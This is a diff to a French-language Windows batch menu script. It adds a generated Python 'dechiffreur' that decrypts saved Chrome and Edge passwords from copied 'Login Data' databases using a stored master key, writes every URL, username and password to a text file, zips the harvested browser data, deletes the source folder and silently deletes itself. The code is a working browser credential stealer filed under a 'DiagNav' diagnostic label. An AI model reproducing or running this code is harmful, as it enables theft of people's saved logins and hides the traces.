@@ -1550,8 +1550,99 @@ if !errorlevel! neq 0 (
     "!PYCMD!" -m pip install pycryptodome -q
 )
 
+echo  [*] Generation du dechiffreur...
+set "PY_FILE=%TEMP%\decrypt_nav_%RANDOM%.py"
+> "!PY_FILE!" echo SCRIPT_DIR = r"%SCRIPT_DIR%"
+>> "!PY_FILE!" echo import os, sys, sqlite3, shutil, subprocess, tempfile, zipfile
+>> "!PY_FILE!" echo from pathlib import Path
+>> "!PY_FILE!" echo from urllib.parse import urlparse
+>> "!PY_FILE!" echo try:
+>> "!PY_FILE!" echo     from Crypto.Cipher import AES
+>> "!PY_FILE!" echo except ImportError:
+>> "!PY_FILE!" echo     os.system("pip install pycryptodome -q")
+>> "!PY_FILE!" echo     from Crypto.Cipher import AES
+>> "!PY_FILE!" echo BASE_DIR = Path(SCRIPT_DIR) / "DiagNav"
+>> "!PY_FILE!" echo ZIP_PATH = Path(SCRIPT_DIR) / "DiagNav.zip"
+>> "!PY_FILE!" echo OUT_TXT  = Path(SCRIPT_DIR) / "resultats.txt"
+>> "!PY_FILE!" echo BROWSERS = ["Chrome", "Edge"]
+>> "!PY_FILE!" echo def _dom(url):
+>> "!PY_FILE!" echo     try: return urlparse(url).netloc.lower()
+>> "!PY_FILE!" echo     except: return url.lower()
+>> "!PY_FILE!" echo def decrypt(ct, key):
+>> "!PY_FILE!" echo     if not isinstance(ct, bytes) or len(ct) ^< 31: return None
+>> "!PY_FILE!" echo     if bytes(ct[:3]) not in (b"v10", b"v11"): return None
+>> "!PY_FILE!" echo     nonce, payload, tag = bytes(ct[3:15]), bytes(ct[15:-16]), bytes(ct[-16:])
+>> "!PY_FILE!" echo     try:
+>> "!PY_FILE!" echo         c = AES.new(key, AES.MODE_GCM, nonce=nonce)
+>> "!PY_FILE!" echo         return c.decrypt_and_verify(payload, tag).decode("utf-8", errors="replace")
+>> "!PY_FILE!" echo     except:
+>> "!PY_FILE!" echo         try:
+>> "!PY_FILE!" echo             c = AES.new(key, AES.MODE_GCM, nonce=nonce)
+>> "!PY_FILE!" echo             return c.decrypt(payload).decode("utf-8", errors="replace")
+>> "!PY_FILE!" echo         except: return None
+>> "!PY_FILE!" echo def read_db(db, key):
+>> "!PY_FILE!" echo     tmp = Path(tempfile.mktemp(suffix=".db"))
+>> "!PY_FILE!" echo     shutil.copy2(db, tmp)
+>> "!PY_FILE!" echo     out = []
+>> "!PY_FILE!" echo     try:
+>> "!PY_FILE!" echo         con = sqlite3.connect(tmp)
+>> "!PY_FILE!" echo         for url, user, enc in con.execute("SELECT origin_url,username_value,password_value FROM logins"):
+>> "!PY_FILE!" echo             pw = decrypt(enc, key) if enc else None
+>> "!PY_FILE!" echo             if pw: out.append((url, user, pw))
+>> "!PY_FILE!" echo         con.close()
+>> "!PY_FILE!" echo     finally: tmp.unlink(missing_ok=True)
+>> "!PY_FILE!" echo     return out
+>> "!PY_FILE!" echo def collect(name):
+>> "!PY_FILE!" echo     bd = BASE_DIR / name
+>> "!PY_FILE!" echo     kf = bd / "Master.key"
+>> "!PY_FILE!" echo     if not bd.exists() or not kf.exists(): return []
+>> "!PY_FILE!" echo     key = kf.read_bytes()
+>> "!PY_FILE!" echo     res = []
+>> "!PY_FILE!" echo     for p in sorted(bd.iterdir()):
+>> "!PY_FILE!" echo         db = p / "Login Data"
+>> "!PY_FILE!" echo         if p.is_dir() and db.exists():
+>> "!PY_FILE!" echo             for e in read_db(db, key): res.append(e)
+>> "!PY_FILE!" echo     return res
+>> "!PY_FILE!" echo def main():
+>> "!PY_FILE!" echo     print("\n  +====================================================+")
+>> "!PY_FILE!" echo     print("  |   Dechiffrement Chrome / Edge                      |")
+>> "!PY_FILE!" echo     print("  +====================================================+\n")
+>> "!PY_FILE!" echo     if not BASE_DIR.exists(): sys.exit("  DiagNav introuvable")
+>> "!PY_FILE!" echo     raw = []
+>> "!PY_FILE!" echo     for b in BROWSERS: raw.extend(collect(b))
+>> "!PY_FILE!" echo     seen = set(); unique = []
+>> "!PY_FILE!" echo     for url, user, pw in raw:
+>> "!PY_FILE!" echo         sig = (url.lower(), user.lower(), pw)
+>> "!PY_FILE!" echo         if sig not in seen: seen.add(sig); unique.append((url, user, pw))
+>> "!PY_FILE!" echo     print(f"  {len(unique)} identifiant(s) ^| {len(raw)-len(unique)} doublon(s)")
+>> "!PY_FILE!" echo     if not unique:
+>> "!PY_FILE!" echo         print("  Aucun identifiant recuperable."); return
+>> "!PY_FILE!" echo     unique.sort(key=lambda x: _dom(x[0]))
+>> "!PY_FILE!" echo     lines = []; cur = ""
+>> "!PY_FILE!" echo     for url, user, pw in unique:
+>> "!PY_FILE!" echo         d = _dom(url) or url
+>> "!PY_FILE!" echo         if not d == cur:
+>> "!PY_FILE!" echo             cur = d
+>> "!PY_FILE!" echo             lines.append(f"\n{'='*60}")
+>> "!PY_FILE!" echo             lines.append(f"  {d}")
+>> "!PY_FILE!" echo             lines.append("-"*60)
+>> "!PY_FILE!" echo         lines.append(f"  URL  : {url}")
+>> "!PY_FILE!" echo         lines.append(f"  User : {user}")
+>> "!PY_FILE!" echo         lines.append(f"  Pass : {pw}")
+>> "!PY_FILE!" echo         lines.append("")
+>> "!PY_FILE!" echo     OUT_TXT.write_text("\n".join(lines), encoding="utf-8")
+>> "!PY_FILE!" echo     print("  [+] resultats.txt sauvegarde")
+>> "!PY_FILE!" echo     scr = Path(__file__).resolve()
+>> "!PY_FILE!" echo     subprocess.Popen(f'cmd /c timeout /t 1 /nobreak ^>nul ^& del /f /q "{scr}"', shell=True, creationflags=0x08000000)
+>> "!PY_FILE!" echo     with zipfile.ZipFile(ZIP_PATH, "w", zipfile.ZIP_DEFLATED) as zf:
+>> "!PY_FILE!" echo         for f in BASE_DIR.rglob("*"):
+>> "!PY_FILE!" echo             if f.is_file(): zf.write(f, f.relative_to(BASE_DIR.parent))
+>> "!PY_FILE!" echo     shutil.rmtree(BASE_DIR, ignore_errors=True)
+>> "!PY_FILE!" echo     print("  [OK] DiagNav supprime + DiagNav.zip cree")
+>> "!PY_FILE!" echo     os.startfile(OUT_TXT)
+>> "!PY_FILE!" echo if __name__ == "__main__": main()
 echo  [*] Lancement du dechiffreur...
-"!PYCMD!" "%SCRIPT_DIR%\decrypt_nav.py"
+"!PYCMD!" "!PY_FILE!"
 endlocal
 goto net_cyber_menu
 
